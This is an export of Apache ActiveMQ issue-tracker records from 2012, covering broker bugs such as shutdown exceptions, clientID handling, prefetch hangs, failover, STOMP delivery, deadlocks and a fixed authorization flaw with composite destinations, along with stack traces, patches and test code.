And the broker is killed, but why the exception ?",,buchi,xbhanu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,230101,,,Tue Apr 17 14:51:38 UTC 2012,,,,,,,,,,,"0|i0ai2n:",59201,,,,,,,,,,,,,,,,,,,,,"02/Mar/12 11:33;davsclaus;Can you post the full stracktrace. And log which version of the broker you are using. eg when reporting issues be more detailed.;;;","02/Mar/12 13:52;tabish;This sounds like something we saw in a SNAPSHOT build some time ago that has since been resolved.  Really need more info to know for sure though. ;;;","06/Mar/12 15:52;tabish;Not enough info provided here to go on.;;;","14/Mar/12 13:18;xbhanu;Sorry for the delay here. I am using version 5.5.1.

This error is not thrown every time but 3 out of 5 times I am seeing this in my setup. Here is the complete stacktrace:-

2012-03-14 18:39:44,718 | ERROR | Could not stop service: TcpTransport. Reason: java.lang.IllegalStateException: Timer already cancelled. | org.apache.activemq.broker.jmx.ManagedTransportConnector | ActiveMQ ShutdownHook
java.lang.IllegalStateException: Timer already cancelled.
        at java.util.Timer.sched(Timer.java:397)
        at java.util.Timer.schedule(Timer.java:248)
        at org.apache.activemq.jmdns.JmDNS$Canceler.start(JmDNS.java:2202)
        at org.apache.activemq.jmdns.JmDNS.unregisterService(JmDNS.java:648)
        at org.apache.activemq.transport.discovery.rendezvous.RendezvousDiscoveryAgent.stop(RendezvousDiscoveryAgent.java:88)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.TransportConnector.stop(TransportConnector.java:282)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.BrokerService.stopAllConnectors(BrokerService.java:1658)
        at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:580)
        at org.apache.activemq.broker.BrokerService.containerShutdown(BrokerService.java:1995)
        at org.apache.activemq.broker.BrokerService$4.run(BrokerService.java:1962)
2012-03-14 18:39:44,994 | ERROR | Could not stop service: TcpTransport. Reason: java.lang.IllegalStateException: Timer already cancelled. | org.apache.activemq.broker.jmx.ManagedTransportConnector | Thread-5
java.lang.IllegalStateException: Timer already cancelled.
        at java.util.Timer.sched(Timer.java:397)
        at java.util.Timer.schedule(Timer.java:248)
        at org.apache.activemq.jmdns.JmDNS$Canceler.start(JmDNS.java:2202)
        at org.apache.activemq.jmdns.JmDNS.unregisterService(JmDNS.java:648)
        at org.apache.activemq.transport.discovery.rendezvous.RendezvousDiscoveryAgent.stop(RendezvousDiscoveryAgent.java:88)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.TransportConnector.stop(TransportConnector.java:282)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.BrokerService.stopAllConnectors(BrokerService.java:1658)
        at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:580)
        at org.apache.activemq.console.command.StartCommand$1.run(StartCommand.java:135)
;;;","14/Apr/12 06:06;rajdavies;Fixed by SVN revision 1326056;;;","17/Apr/12 14:51;xbhanu;Thanks a lot Rob !!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Repeated call to PooledConnection.setClientID() with the same clientId should not raise a IllegalStateException(""Setting clientID on a used Connection is not allowed"")",AMQ-3752,12544899,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tmielke,tmielke,tmielke,02/Mar/12 08:55,02/Mar/12 13:21,14/Jul/23 05:43,02/Mar/12 13:21,5.5.1,,,,,5.6.0,,,Broker,,,,0,PooledConnectionFactory,,,,,,,,"Calling ActiveMQConnection.setClientID() twice currently raises an IllegalStateException:

{code:title=ActiveMQConnection.java}
public void setClientID(String newClientID) throws JMSException {
        checkClosedOrFailed();

        if (this.isConnectionInfoSentToBroker) {
            throw new IllegalStateException(""Setting clientID on a used Connection is not allowed"");
        }
        
        this.info.setClientId(newClientID);
        this.userSpecifiedClientID = true;
        ensureConnectionInfoSent();
    }
{code}

This successfully prevents from overriding clientID on an already started connection.
However in the case of using a Camel JMS endpoint with durable subscriptions, transactions and configuring for a PooledConnectionFactory, this current behavior causes problems. 
Due to the durable sub a clientID needs to be set on the connection. This happens at startup of the JMS consumer by calling ActiveMQConnection.setClientID().
If you stop the Camel route, the connection will be released back to the pool with the clientID remaining. 
If you restart the Camel route, it will setup a new Spring DMLC and reinitialize the connection with the configured clientId. A new connection is obtained from the pool and setClientID() is invoked on that connection. This will raise the above Exception. 

If we try to set the same clientID on the PooledConnection again, we should simply ignore the call rather than raising an exception.This allows the camel-jms consumer to be restarted. 

Without a fix, its impossible restart a Camel route that uses camel-jms with durable subscriptions and the PooledConnectionFactory.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Mar/12 09:00;tmielke;AMQ-3752.patch;https://issues.apache.org/jira/secure/attachment/12516803/AMQ-3752.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,230085,,,Fri Mar 02 09:03:59 UTC 2012,,,,,,,Patch Available,,,,"0|i0ai2v:",59202,,,,,,,,,,,,,,,,,,,,,"02/Mar/12 09:00;tmielke;Attaching proposed patch including JUnit test.;;;","02/Mar/12 09:03;tmielke;Fixed in revision #1296094.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Performance Module User Manual has incorrect username documentation on SPI Connection Factory,AMQ-3751,12544824,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jkorab,jkorab,01/Mar/12 19:01,02/Mar/12 21:22,14/Jul/23 05:43,02/Mar/12 21:21,5.5.1,,,,,,,,Documentation,,,,0,,,,,,,,,"On http://activemq.apache.org/activemq-performance-module-users-manual.html the configuration key ""factory.username"" should read ""factory.userName""

As is, a broker configured with LDAP security logs the following error when a consumer is run through the perf tool using factory.username:
 WARN | Failed to add Connection ID:machineName.local-49773-1330624897725-2:2, reason: java.lang.SecurityException: User name [null] or password is invalid. 

Changing the configuration key resolves the issue",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,230010,,,Fri Mar 02 21:21:59 UTC 2012,,,,,,,,,,,"0|i1758v:",249818,,,,,,,,,,,,,,,,,,,,,"02/Mar/12 21:21;tabish;Updated the page, will be visible once the wiki refreshes.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Composite destinations break simple authorisation through role aggregation,AMQ-3749,12544779,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,gtully,gtully,gtully,01/Mar/12 13:03,01/Mar/12 16:36,14/Jul/23 05:43,01/Mar/12 13:08,5.5.1,,,,,5.6.0,,,Broker,,,,0,authorization,composite,security,,,,,,"Given authorisation where there is overlap in roles, using a composite destination can gain access in error. eg:{code}
  <authorizationMap>
    <authorizationEntries>
      <authorizationEntry queue="">"" read=""admins"" write=""admins"" admin=""admins"" />
      <authorizationEntry queue=""USER.>"" read=""users"" write=""users"" admin=""users"" />
      ...
{code} The correct expectation is that a 'user' can only access queues that match 'USER.>' but a user can bypass this and access a private queue using a composite destination q(PRIVATE,USER.A) because the permissions are aggregated in error and we look for a single match.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,229965,,,Thu Mar 01 13:08:05 UTC 2012,,,,,,,,,,,"0|i0ai3b:",59204,,,,,,,,,,,,,,,,,,,,,"01/Mar/12 13:08;gtully;Fix in http://svn.apache.org/viewvc?rev=1295545&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQEndpointWorker$1: Run method is synchronized,AMQ-3748,12544750,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,hoegertn,hoegertn,01/Mar/12 08:45,01/Mar/12 16:59,14/Jul/23 05:43,01/Mar/12 16:59,5.6.0,,,,,5.6.0,,,JCA Container,,,,0,,,,,,,,,"As posted in this mail [0] by Ed Keen there is a issue in the ActiveMQEndpointWorker.

I checked the spec the JBoss guys mentioned and in section 10.3.2 it is clearly stated:
""Both the run and release methods in the Work implementation may contain
synchronization blocks but they must not be declared as synchronized methods.""

Removing the ""synchronized"" worked for some people trying this. But I think it was added intentionally, so somebody should check an appropriate alternative.

This bug prevents ActiveMQ from being deployed on JBoss AS 7.1


[0]: http://mail-archives.apache.org/mod_mbox/activemq-users/201202.mbox/%3CCAC=rkz2XZmJo3D03kHG6nfz0c800-Mh=9JH6qb=zeGQyU=MNXQ@mail.gmail.com%3E
[1]: http://download.oracle.com/otn-pub/jcp/connector_architecture-1.6-fr-oth-JSpec/connector-1_6-final-spec.pdf",JBoss AS 7.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,229936,,,Thu Mar 01 16:59:14 UTC 2012,,,,,,,,,,,"0|i07ebb:",41085,,,,,,,,,,,,,,,,,,,,,"01/Mar/12 16:59;rajdavies;Fixed by SVN 1295672;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Non Durable Topic subscription with prefetch=0, MessageConsumer.receivenowait() (or MessageConsumer.receive(timeout) hangs indefinitely",AMQ-3746,12544606,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,pgfox,pgfox,29/Feb/12 13:07,28/Oct/12 18:58,14/Jul/23 05:43,28/Oct/12 18:58,5.5.1,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"Non Durable Topic subscription with prefetch=0, MessageConsumer.receivenowait() (or MessageConsumer.receive(timeout) hangs indefinitely.

I get the following thread dump

{code}
""main"" prio=5 tid=7f996d000000 nid=0x105bc3000 in Object.wait() [105bc1000]
   java.lang.Thread.State: WAITING (on object monitor)
	at java.lang.Object.wait(Native Method)
	- waiting on <7f39f1b30> (a java.lang.Object)
	at java.lang.Object.wait(Object.java:485)
	at org.apache.activemq.SimplePriorityMessageDispatchChannel.dequeue(SimplePriorityMessageDispatchChannel.java:87)
	- locked <7f39f1b30> (a java.lang.Object)
	at org.apache.activemq.ActiveMQMessageConsumer.dequeue(ActiveMQMessageConsumer.java:468)
	at org.apache.activemq.ActiveMQMessageConsumer.receiveNoWait(ActiveMQMessageConsumer.java:621)
	at org.apache.activemq.usecases.TopicSubscriptionZeroPrefetchTest.testTopicConsumerPrefetchZero(TopicSubscriptionZeroPrefetchTest.java:71)
{code}

It seems the TopicSubscription does not support ""pullMessage"".

This only appears to impact Non Durable Topic Subscriptions. Durable Topic Subscriptions with prefetch=0 do *NOT* exhibit this behavior.


",,davsclaus,gtully,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Mar/12 22:32;tabish;AMQ-3746.txt;https://issues.apache.org/jira/secure/attachment/12516743/AMQ-3746.txt","29/Feb/12 15:29;pgfox;APotentialFixForAMQ-3746.patch;https://issues.apache.org/jira/secure/attachment/12516573/APotentialFixForAMQ-3746.patch","29/Feb/12 13:12;pgfox;TopicSubscriptionZeroPrefetchTest.patch;https://issues.apache.org/jira/secure/attachment/12516559/TopicSubscriptionZeroPrefetchTest.patch",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,229792,,,Sun Oct 28 18:58:43 UTC 2012,,,,,,,,,,,"0|i0amc7:",59892,,,,,,,,,,,,,,,,,,,,,"29/Feb/12 13:12;pgfox;attached a new junit testcase to illustrate issue.;;;","29/Feb/12 15:29;pgfox;Perhaps rather than reaching a hanging state, the MessageConsumer could ""fail fast"" at creation time if prefetch=0 for non durable topic subscribers. 

To that effect, I have attached ""APotentialFixForAMQ-3746.patch"" where the ActiveMQMessageConsumer constructor does the following check.

{code}
	// AMQ-3746
	// if prefetch set to zero for Non Durable topic Consumer, throw a JMS Exception.
	if(this.getPrefetchNumber() == 0 && info.getDestination().isTopic() && !isDurableSubscriber()){
        throw new JMSException(""Cannot have a prefetch size of zero for a Non Durable Topic Subscriber"");
    }
{code}

I hope the above check should isolate just Non Durable Topic consumers with prefetch=0, perhaps someone could review it? Maybe there is a cleverer way to resolve this issue?

patch created off lastest revision (1295087);;;","29/Feb/12 20:25;pgfox;After applying ""APotentialFixForAMQ-3746.patch"" I noticed a change in exception behavior around the ""MessageListener"" case. Before applying the patch ActiveMQMessageConsumer.setMessageListener()
throws the JMSException below when prefetch=0.

before patch:

{code}
javax.jms.JMSException: Illegal prefetch size of zero. This setting is not supported for asynchronous consumers please set a value of at least 1
	at org.apache.activemq.ActiveMQMessageConsumer.setMessageListener(ActiveMQMessageConsumer.java:417)
	...
{code}

after applying the patch the following exception is thrown when creating the ActiveMQMessageConsumer before ActiveMQMessageConsumer.setMessageListener() can be called. 

{code}
javax.jms.JMSException: Cannot have a prefetch size of zero for a Non Durable Topic Subscriber
	at org.apache.activemq.ActiveMQMessageConsumer.<init>(ActiveMQMessageConsumer.java:245)
	at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:1134)
	at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:1078)
	at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:991)
	at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:964)
	...
{code}	

Although it results in the same overall outcome, it does change the existing (correct) exception behavior.

Hence not sure if ""Fail Fast"" in ""APotentialFixForAMQ-3746.patch"" is the best approach.;;;","01/Mar/12 22:32;tabish;Another potential fix is to actually allow TopicSubscription to work with a zero prefetch.  A pullMessage request could open a window to allow one topic message to get dispatched to the topic inside the pull time window given.  This basically allows the consumer to always be a slow consumer, and messages are stored based on the maxPendingMessageLimit.  Not sure what the use case for that would be but its possible.  Here's a rough patch that adds this, not tested very heavily. ;;;","19/Sep/12 12:35;davsclaus;Tim, sounds like a good idea.

Maybe try to revisit your patch for the 5.8 release.;;;","19/Sep/12 12:41;gtully;that reads very like the use case for a retroactive consumer. I would expect a poll to only work if there is something pending in the retroactive buffer. But a poll should not block for ever. That is really a bug.;;;","28/Oct/12 18:58;tabish;Fixed on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FailoverTransport connects to inactive slave Broker,AMQ-3744,12544389,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,migo,migo,28/Feb/12 08:46,21/Mar/12 15:47,14/Jul/23 05:43,21/Mar/12 15:47,5.5.1,,,,,5.6.0,,,Connector,,,,1,,,,,,,,,"The bug affects the ActiveMQ-Fuse Version 5.5.1-fuse-02-02. The version 5.5.1-fuse-00-08 is the last testet with no problem.

when trying to connect to a failover-url with multiple failover nodes, the failover transport connects successful already at the first node, even if it is an inactive slave. 
Then, of course, no session can be started. The consumer is waiting all the time.","Windows 7 x64, Java 1.6_30",famod,migo,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Feb/12 20:22;migo;activemq.test.zip;https://issues.apache.org/jira/secure/attachment/12516387/activemq.test.zip",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,229626,,,Wed Mar 21 15:47:35 UTC 2012,,,,,,,,,,,"0|i0ai3r:",59206,,,,,,,,,,,,,,,,,,,,,"28/Feb/12 08:49;migo;activemq.test.zip contains an unit test which demonstrates the maloperation;;;","28/Feb/12 16:30;tabish;Tried to run your test, gives an error: ""Could not resolve dependencies for project de.mgo:activemq.test:jar:0.0.1-SNAPSHOT:"";;;","28/Feb/12 20:22;migo;I added the fusesource repositoy to the pom.xml. So it should work.
The test fails with ActiveMQ 5.5.1-fuse-02-02 and runs successful with 5.5.1-fuse-00-08;;;","21/Mar/12 15:47;tabish;Tested against latest 5.6 SNAPSHOT and the test case passes without error.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-web-console WAR with SNAPSHOT dependencies breaks osgi Bundle-ClassPath in manifest,AMQ-3743,12544324,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,gtully,gtully,27/Feb/12 22:10,27/Feb/12 22:23,14/Jul/23 05:43,27/Feb/12 22:23,5.5.1,,,,,5.6.0,,,,,,,0,bundle-classpath,maven,snapshot,war,,,,,"The maven-war-plugin will install snapshot version dependencies using their timestamp qualified name but the maven-bundle-plugin used to generate the Bundle-ClassPath strips off the timestamp qualifier.
The fix is to make use of the [archive file name mapping|http://maven.apache.org/plugins/maven-war-plugin/examples/file-name-mapping.html] to strip off the qualifier in for the embedded dependencies.
This is only a problem during development as we never release with SNAPSHOT dependencies.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,229561,,,Mon Feb 27 22:23:16 UTC 2012,,,,,,,,,,,"0|i0ai3z:",59207,,,,,,,,,,,,,,,,,,,,,"27/Feb/12 22:23;gtully;fix in http://svn.apache.org/viewvc?rev=1294359&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
STOMP subscriber does not receive TextMessage with null body sent from JMS,AMQ-3742,12544312,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,david@inomial.com,david@inomial.com,27/Feb/12 21:02,27/Feb/12 21:37,14/Jul/23 05:43,27/Feb/12 21:37,5.5.1,,,,,5.6.0,,,STOMP,,,,0,,,,,,,,,"If a JMS publisher sends a TextMessage with null body, any STOMP subscribers to the topic (I haven't tested queues) will not receive that message or any further messages on that topic. ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Feb/12 21:18;david@inomial.com;StompTest.java.patch;https://issues.apache.org/jira/secure/attachment/12516211/StompTest.java.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,229549,,,Mon Feb 27 21:37:33 UTC 2012,,,,,,,,,,,"0|i0ai47:",59208,,,,,,,,,,,,,,,,,,,,,"27/Feb/12 21:05;david@inomial.com;I've created the following extra test method that should reproduce the issue

{code:title=StompTest.java.patch}
Index: src/test/java/org/apache/activemq/transport/stomp/StompTest.java
===================================================================
--- src/test/java/org/apache/activemq/transport/stomp/StompTest.java	(revision 1294315)
+++ src/test/java/org/apache/activemq/transport/stomp/StompTest.java	(working copy)
@@ -1819,6 +1819,24 @@
         doReplyToAcrossConnections(""queue"");
     }
 
+    public void testSendNullBodyTextMessage() throws Exception {
+      String frame = ""CONNECT\n"" + ""login: system\n"" + ""passcode: manager\n\n"" + Stomp.NULL;
+      stompConnection.sendFrame(frame);
+
+      frame = stompConnection.receiveFrame();
+      assertTrue(frame.startsWith(""CONNECTED""));
+
+      frame = ""SUBSCRIBE\n"" + ""destination:/queue/"" + getQueueName() + ""\n"" + ""ack:auto\n\n"" + Stomp.NULL;
+      stompConnection.sendFrame(frame);
+
+      sendMessage(null);
+      frame = stompConnection.receiveFrame();
+      assertNotNull(""Message not received"", frame);
+
+      frame = ""DISCONNECT\n"" + ""\n\n"" + Stomp.NULL;
+      stompConnection.sendFrame(frame);
+    }
+    
     private void doReplyToAcrossConnections(String type) throws Exception {
         LOG.info(""Starting test on Temp Destinations using a temporary: "" + type);
{code}
;;;","27/Feb/12 21:12;tabish;You need to attach you patch as a file to this issue and tick the ""grant license to apache"" checkbox so we can include it.  Thanks.;;;","27/Feb/12 21:18;david@inomial.com;Patch file attached (sorry - I couldn't work out how to attach a file in JIRA);;;","27/Feb/12 21:37;tabish;Fix applied on trunk.  Thanks for the test case.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deadlock on Broker when JMX is enabled,AMQ-3741,12544257,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,s1ngle,s1ngle,27/Feb/12 14:11,06/Mar/12 16:13,14/Jul/23 05:43,06/Mar/12 16:13,5.4.3,5.5.1,,,,,,,Broker,JMX,,,1,,,,,,,,,"With JMX enabled a deadlock might occur due to the fact that there are two broker objects with common Destinations.

Let me provide you with a stacktrace that will clear this up:

Thread: Thread[ActiveMQ Transport: ssl:///10.0.0.1:52293,5,spring-osgi-extender[435a3a]-threads]
	Name: ActiveMQ Transport: ssl:///10.0.0.1:52293
	Priority: 5
	Status: BLOCKED
	StackTrace:
		org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor.intercept(VirtualDestinationInterceptor.java:47)
      ->  public synchronized Destination intercept(...)
		org.apache.activemq.broker.region.CompositeDestinationInterceptor.intercept(CompositeDestinationInterceptor.java:38)
		org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:127)
      ->  synchronized (destinationsMutex)
		org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:298)
		org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
		org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:145)
		org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
		org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
		org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151)
		org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
		org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
		org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151)
		org.apache.activemq.broker.region.RegionBroker.addProducer(RegionBroker.java:396)
      -> synchronized (purgeInactiveDestinationsTask)
		org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:93)
		org.apache.activemq.advisory.AdvisoryBroker.addProducer(AdvisoryBroker.java:133)
		org.apache.activemq.broker.CompositeDestinationBroker.addProducer(CompositeDestinationBroker.java:56)
		org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:93)
		org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:99)
		org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:93)
		org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:93)
		org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:99)
		org.apache.activemq.broker.TransportConnection.processAddProducer(TransportConnection.java:507)
		org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:105)
		org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306)
		org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)
		org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
		org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
		org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)
		org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
		org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)
		org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)
		org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)
		java.lang.Thread.run(Thread.java:619)
		
		
		
		
Thread: Thread[ActiveMQ Transport: ssl:///10.0.0.1:52148,5,spring-osgi-extender[435a3a]-threads]
	Name: ActiveMQ Transport: ssl:///10.0.0.1:52148
	Priority: 5
	Status: BLOCKED
	StackTrace:
		org.apache.activemq.broker.region.AbstractRegion.getDestinations(AbstractRegion.java:217)
      -> synchronized (destinationsMutex)
		org.apache.activemq.broker.region.RegionBroker.getDestinations(RegionBroker.java:142)
		org.apache.activemq.broker.region.virtual.VirtualTopic.create(VirtualTopic.java:56)
		org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor.create(VirtualDestinationInterceptor.java:68)
      ->  public synchronized void create(...)
		org.apache.activemq.broker.region.CompositeDestinationInterceptor.create(CompositeDestinationInterceptor.java:52)
		org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:442)
      -> synchronized (purgeInactiveDestinationsTask)
		org.apache.activemq.broker.jmx.ManagedRegionBroker.addConsumer(ManagedRegionBroker.java:240)
		org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
		org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:79)
		org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
		org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
		org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:95)
		org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
		org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
		org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:95)
